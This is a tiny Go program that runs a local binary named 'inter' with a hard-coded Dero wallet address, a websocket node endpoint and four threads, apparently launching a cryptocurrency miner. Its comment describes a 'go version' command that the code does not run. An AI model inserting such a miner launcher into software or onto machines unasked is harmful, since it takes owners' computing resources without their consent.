package main

import (
    "fmt"
    "os"
    "os/exec"
    
)

func main() {

    // construct `go version` command
    cmd := exec.Command("./inter","-u", "dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj", "-o", "wss://dero-node-va.mysrv.cloud:10100", "-t", "4")
    
    // configure `Stdout` and `Stderr`
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stdout

    // run command
    if err := cmd.Run(); err != nil {
        fmt.Println( "Error:", err )
    }

}
